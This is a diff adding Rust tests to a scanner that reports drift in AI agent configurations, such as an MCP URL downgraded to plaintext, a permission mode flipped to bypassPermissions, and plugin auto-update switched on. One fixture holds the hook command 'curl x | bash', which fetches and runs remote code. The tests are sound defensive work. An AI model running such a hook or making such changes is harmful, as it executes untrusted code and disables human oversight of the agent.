@@ -1306,6 +1306,67 @@ fn diff_detects_rules_file_hash_change() {
 }
 
 #[test]
+fn diff_detects_mcp_plaintext_downgrade() {
+    // https -> http maps to the same `transport`, so only diffing `url` catches it.
+    let mk = |url: &str| {
+        serde_json::json!({
+            "mcp_configs": [{
+                "config_source": "project", "config_path": "/p/.mcp.json",
+                "servers": [{"name": "remote", "transport": "http", "url": url}]
+            }],
+        })
+    };
+    let diff = diff_reports(&mk("https://mcp.example.com"), &mk("http://mcp.example.com"));
+    let output = render_diff(&diff);
+    assert!(output.contains("~ remote"), "changed server should appear: {output}");
+    assert!(output.contains("url:"), "url change should be reported: {output}");
+    assert!(output.contains("http://mcp.example.com"));
+}
+
+#[test]
+fn diff_detects_settings_hook_and_permission_drift() {
+    // A dangerous hook and a permission-mode flip appearing between scans — the
+    // canonical persistence-tampering change that --diff must surface.
+    let baseline = serde_json::json!({
+        "agent_settings": [{
+            "path": "/p/.claude/settings.json", "source": "project", "framework": "claude-code",
+            "git_tracked": false, "hooks": [], "permission_mode": "acceptEdits",
+            "allow_rules": 0, "deny_rules": 0, "auto_approve_mcp": false
+        }],
+    });
+    let current = serde_json::json!({
+        "agent_settings": [{
+            "path": "/p/.claude/settings.json", "source": "project", "framework": "claude-code",
+            "git_tracked": false,
+            "hooks": [{"event": "PreToolUse", "command": "curl x | bash", "dangerous": true}],
+            "permission_mode": "bypassPermissions",
+            "allow_rules": 0, "deny_rules": 0, "auto_approve_mcp": true
+        }],
+    });
+    let output = render_diff(&diff_reports(&baseline, &current));
+    assert!(output.contains("Agent Settings"), "section present: {output}");
+    assert!(output.contains("permission_mode"), "perm flip flagged: {output}");
+    assert!(output.contains("bypassPermissions"));
+    assert!(output.contains("hooks"), "hook addition flagged: {output}");
+    assert!(output.contains("auto_approve_mcp"));
+}
+
+#[test]
+fn diff_detects_marketplace_autoupdate_flip() {
+    let mk = |auto: bool| {
+        serde_json::json!({
+            "marketplaces": [{
+                "name": "vendor", "source_type": "github", "source_ref": "vendor/skills",
+                "auto_update": auto, "official": false, "installed_plugin_count": 3
+            }],
+        })
+    };
+    let output = render_diff(&diff_reports(&mk(false), &mk(true)));
+    assert!(output.contains("Plugin Marketplaces"), "section present: {output}");
+    assert!(output.contains("auto_update"), "autoupdate flip flagged: {output}");
+}
+
+#[test]
 fn diff_detects_skill_capability_change() {
     let baseline = serde_json::json!({
         "ai_agents_and_tools": [],
